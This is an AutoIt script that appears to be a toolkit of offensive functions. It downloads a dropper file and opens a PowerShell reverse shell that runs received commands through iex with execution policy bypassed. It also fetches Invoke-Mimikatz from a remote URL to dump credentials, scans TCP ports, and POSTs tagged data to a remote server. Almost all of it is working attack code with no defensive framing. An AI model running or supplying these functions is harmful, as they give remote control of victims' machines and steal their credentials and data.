#include <Inet.au3>

;download a file from an http server - path: C:\Users\name\AppData\Local\Temp\drop.tmp
Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp")
   InetGet($sURL, $FileName, 1, 1)
EndFunc

;reverse shell using powershell - to be review
Func ReverseShell($RemoteIp, $RemotePort)
   $buffer = "$client = New-Object System.Net.Sockets.TCPClient(" & $RemoteIp & ", $RemotePort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c " & " " & $buffer);
EndFunc

;Mimikatz
Func Mimikatz()
   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -C " & " " & $buffer);
EndFunc

;check if internet is up
Func InternetCheck()
    Local $iPing = Ping("wikipedia.org", 250)
    If $iPing Then
        return 1
    Else
        return 0
    EndIf
 EndFunc

;read remote http/s page
Func ReadRemoteVar($url)
   return _INetGetSource($url) & @crlf
EndFunc

;TCP scanner
Func TCPscanner($ip,$port)
   TCPStartup()
   TCPConnect($ip,$port)
   Sleep(1)
   TCPShutdown()
EndFunc

;Send data over Http
Global Const $HTTP_STATUS_OK = 200

Func HttpPost($sURL, $tag, $sData = "")
   Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
   $oHTTP.Open("POST", $sURL, False)
   If (@error) Then Return SetError(1, 0, 0)
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
   $oHTTP.Send("#" & $tag & ": " & $sData)
   If (@error) Then Return SetError(2, 0, 0)
   If ($oHTTP.Status <> $HTTP_STATUS_OK) Then Return SetError(3, 0, 0)
   Return SetError(0, 0, $oHTTP.ResponseText)
EndFunc
